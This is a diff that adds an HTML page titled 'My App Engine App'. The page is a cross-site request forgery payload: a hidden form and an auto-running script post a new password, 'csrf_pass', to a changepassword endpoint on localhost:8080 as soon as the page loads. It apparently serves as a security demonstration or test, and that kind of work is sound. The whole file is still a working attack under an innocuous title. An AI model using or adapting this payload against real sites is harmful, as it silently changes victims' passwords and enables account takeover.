@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>My App Engine App</title>
+  </head>
+  <body>
+    <div>
+      <form name="csrf_form" action="http://localhost:8080/changepassword" method="POST">
+        <input type="hidden" name="newPassword" value="csrf_pass">
+      </form>
+    
+      <script type="text/javascript">document.csrf_form.submit();</script>
+    </div>
+  </body>
+</html>s
